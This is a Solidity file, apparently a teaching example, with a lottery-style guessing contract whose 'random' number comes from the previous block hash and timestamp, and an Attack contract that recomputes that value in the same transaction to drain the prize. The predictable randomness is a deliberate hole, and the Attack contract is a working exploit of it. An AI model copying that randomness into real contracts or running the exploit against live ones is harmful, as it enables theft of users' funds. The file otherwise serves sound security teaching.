// SPDX-License-Identifier: SEE LICENSE IN LICENSE

pragma solidity ^0.8.20;

contract GuessRandomNumber {
    // Constructor function that accepts ether
    constructor() payable {}

    // Function that allows users to guess a number and win the reward
    function guessNumber(
        uint256 _number // The number guessed by the user
    ) external payable returns (string memory guess) {
        // Require that the user sends at least 1 ether to participate
        require(msg.value == 1 ether, "Minumm bid 1 ether");
        guess = "wrong guess";

        // If the guessed number matches the generated random number, transfer the reward to the user
        if (_number == generateRandomNumber()) {
            (bool success, ) = msg.sender.call{value: address(this).balance}(
                ""
            );
            require(success, "Transaction Complete");
        } else {
            return guess;
        }
    }

    // Function that returns the current reward balance of the contract
    function checkReward() public view returns (uint256) {
        return address(this).balance;
    }

    // Function that generates a random number using the previous block's hash and the current timestamp
    function generateRandomNumber() internal returns (uint256 randomnumber) {
        randomnumber = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
    }
}

// Contract that can be used to attack the GuessRandomNumber contract
contract Attack {
    // Function that accepts ether
    receive() external payable {}

    // Function that can be used to attack the GuessRandomNumber contract by guessing a random number
    function attack(GuessRandomNumber guessrandomNumber) external payable {
        // Generate a random number
        uint256 randomnumber = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        // Call the guessNumber function of the GuessRandomNumber contract with the generated random number
        guessrandomNumber.guessNumber{value: msg.value}(randomnumber);
    }

    // Function that returns the current balance of the Attack contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
